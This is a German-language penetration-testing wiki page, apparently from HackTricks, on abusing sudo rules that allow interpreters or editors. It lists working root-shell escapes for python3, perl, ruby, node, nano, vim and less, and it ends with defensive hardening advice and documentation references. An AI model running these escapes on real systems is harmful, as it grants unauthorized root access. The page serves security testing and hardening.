# Missbrauch von Sudo-Befehlen

{{#include ../../banners/hacktricks-training.md}}

## Von Sudo erlaubte Interpreter

Wenn `sudo -l` einem Benutzer erlaubt, einen Interpreter als root auszuführen, sollte dies als direkte Codeausführung behandelt werden. Interpreter sind dafür ausgelegt, beliebigen Code auszuführen. Eine Regel, die `python3`, `perl`, `ruby`, `lua`, `node` oder ähnliche Binaries erlaubt, entspricht daher normalerweise der Ausführung von Befehlen als root, sofern die Argumente nicht strikt eingeschränkt und validiert werden.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Üblicher Prüfablauf: Zuerst die Berechtigungen des Benutzers auflisten und anschließend mit der Option `-c` des Interpreters eine Python-Anweisung ausführen.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Weitere Beispiele für Interpreter sind unten aufgeführt; die aufgeführten Interpreter dokumentieren die Ausführung von Inline-Code oder APIs für untergeordnete Prozesse.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Der genaue Pfad ist entscheidend. Wenn die sudo-Regel `/usr/bin/python3` erlaubt, verwenden Sie bei der Validierung genau diesen Pfad.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Von sudo erlaubte Editoren

Wenn `sudo -l` einem Benutzer erlaubt, einen interaktiven Editor als root auszuführen, sollte dies als Möglichkeit zur Befehlsausführung und nicht als harmlose Berechtigung zum Bearbeiten von Dateien betrachtet werden. Editoren können häufig Shell-Befehle ausführen, beliebige Dateien lesen, beliebige Dateien schreiben oder aus dem Editor heraus externe Helfer aufrufen.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Üblicher Prüfablauf: Die Berechtigungen des Benutzers auflisten und anschließend jeden erlaubten Editor oder pager mit sudo aufrufen.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano-Befehlsausführung

Wenn `nano` über sudo erlaubt ist, kann die Befehlsausführung über die Editor-Oberfläche erreichbar sein.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Gib dann einen Befehl wie `id` oder `/bin/sh` an der nano-Eingabeaufforderung ein.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Wenn eine interaktive Shell keine nutzbaren Terminalstreams besitzt, ordnet diese Umleitungsform ihre Standardausgabe und ihren Standardfehler dem Deskriptor 0 zu.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Die genaue Tastenkombination kann je nach nano-Version und Build-Optionen variieren, aber das Sicherheitsproblem ist dasselbe: Der Editor läuft als root und kann externe Befehle ausführen.<sup>[[1]](#references)[[12]](#references)</sup>

### Andere häufige Editor escapes

Vim-artige Editoren ermöglichen die Befehlsausführung häufig über `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Pager wie `less` können ebenfalls die Ausführung von Shell-Befehlen ermöglichen.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Defensive Hinweise

- Vermeide es, Interpreters oder interaktive Editoren über sudo zu gewähren.<sup>[[1]](#references)</sup>
- Bevorzuge feste, dem Benutzer root gehörende Wrapper, die genau eine eng begrenzte administrative Aktion ausführen.<sup>[[1]](#references)[[2]](#references)</sup>
- Wenn ein Interpreter unvermeidbar ist, beschränke den exakten Script-Pfad und verhindere benutzerkontrollierte Argumente, beschreibbare Imports, `PYTHONPATH` sowie die unsichere Beibehaltung der Umgebung.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Wenn die Bearbeitung von Dateien erforderlich ist, beschränke den exakten Dateipfad und ziehe `sudoedit` mit gepatchten sudo-Versionen und strikter Umgebungsverwaltung in Betracht.<sup>[[1]](#references)[[2]](#references)</sup>
- Überprüfe `SETENV`, `env_keep`, beschreibbare Arbeitsverzeichnisse, beschreibbare Modul-/Importpfade, `NOEXEC`, `use_pty` und Logging, betrachte sie jedoch nicht als vollständige Sandbox.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Befehlszeile und Umgebung — Python-Dokumentation](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Verschiedene Betriebssystem-Schnittstellen — Python-Dokumentation](https://docs.python.org/3/library/os.html)
- [5] [perlrun — Ausführen des Perl-Interpreters](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl-Dokumentation](https://perldoc.perl.org/functions/exec)
- [7] [Ruby-Befehlszeilenoptionen](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby-Dokumentation](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Befehlszeilen-API — Node.js-Dokumentation](https://nodejs.org/api/cli.html)
- [10] [Kindprozess — Node.js-Dokumentation](https://nodejs.org/api/child_process.html)
- [11] [Lua-5.4-Manpage](https://www.lua.org/manual/5.4/lua.html)
- [12] [Der GNU-Nano-Texteditor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Umleitungen — Bash-Referenzhandbuch](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
